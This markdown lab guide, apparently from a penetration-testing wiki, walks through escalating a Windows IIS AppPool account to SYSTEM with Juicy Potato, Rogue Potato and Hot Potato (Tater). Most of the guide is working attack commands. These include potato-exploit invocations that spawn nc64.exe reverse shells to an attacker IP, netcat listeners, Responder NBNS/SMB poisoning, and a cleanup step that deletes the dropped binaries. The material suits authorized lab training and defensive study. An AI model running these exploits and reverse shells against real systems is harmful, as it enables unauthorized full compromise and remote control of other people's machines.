# Juicy Potato

## Hot Potato Lab – IIS AppPool Privesc to SYSTEM

> OS Targets :

- Windows 7 Ultimate (Build 7600)

- Windows Server 2012 R2 (Build 9600)

- Windows 8.1 Pro


> User Context :

- `iis apppool\defaultapppool`

- Has `SeImpersonatePrivilege`


## Goal

**Escalate from `iis apppool\defaultapppool` to SYSTEM** using **Hot Potato**, **Juicy Potato**, or **Rogue Potato** – depending on the OS version.


## Step-by-Step Lab Flow

### Upload Required Tools

> Make sure the following files are present on the target (e.g., `C:\inetpub\wwwroot\upload`):

- `JuicyPotato.exe`

- `nc64.exe` (or `nc.exe`)

- `RoguePotato.exe` (for Win 8.1 / 2012 R2)

- Optional: `whoami.exe`, `cmd.exe`, `PowerShell`, `webshell.aspx`


### Juicy Potato

>  On Kali:

```bash
rlwrap nc -lvnp 4433
```

[Fresh potatoes](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)

```cmd
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\windows\system32\nc64.exe -e cmd.exe 192.168.1.7 4433" -t *
```

- `-l 1337`: Bind port

- `-p`: Payload executable (cmd.exe)

- `-a`: Arguments (nc reverse shell to your Kali)

- `-t *`: Token type (auto)


### Rogue Potato

[Rogue Potato](https://github.com/antonioCoco/RoguePotato/releases)

 - Kali Listener:

```bash
rlwrap nc -lvnp 4433
```

```cmd
RoguePotato.exe -r 192.168.1.7 -e "cmd.exe /c whoami" -l 9999
```

> Or for reverse shell:

```cmd
RoguePotato.exe -r 192.168.1.7 -e "cmd.exe /c c:\windows\system32\nc64.exe -e cmd.exe 192.168.1.7 4433" -l 9999
```


### Hot Potato (Windows 7 / Legacy Only)

[Hot Potato](https://github.com/Kevin-Robertson/Tater) (`Tater.exe`)

- From low-priv shell:

```cmd
Tater.exe -i 1 -r 192.168.1.6 -l 80 -c "C:\windows\temp\nc64.exe -e cmd.exe 192.168.1.6 5555"
```

- This will spoof NBNS, relay NTLM auth, and escalate.


> Kali:

```bash
sudo responder -I eth0
```

```bash
nc -lvnp 5555
```

>  Must run **Responder** on attacker machine to poison NBNS and SMB/HTTP relays.

### Cleanup Tip

Remove the binaries after use:

```cmd
del C:\inetpub\wwwroot\upload\JuicyPotato.exe
del C:\inetpub\wwwroot\upload\nc64.exe
```

## Confirm SYSTEM Access

After shell pops:

```cmd
whoami
```

Expected:

```text
nt authority\system
```

## Extra Tips

- Always **check SeImpersonatePrivilege** before running potato exploits.

- Some AppPool identities don’t have full access; use **custom AppPools** if needed.

- Try multiple token types: `-t t`, `-t *`, or specify CLSID in JuicyPotato.

- On some setups, **UAC** or **Token Filtering** may block shell.

## Related
- [Impersonation and Potato Attacks](Impersonation-and-Potato-Attacks.md) — parent hub
- [JuicyPotatoNG](JuicyPotatoNG.md) — updated variant for patched Windows
- [God Potato](God-Potato.md) — modern DCOM/RPC potato
- [Token Impersonation](Token-Impersonation.md) — SeImpersonate/SeAssignPrimaryToken abuse
- [Potato Attacks Lab Setup](Potato-Attacks-Lab-Setup.md) — lab to reproduce the attack
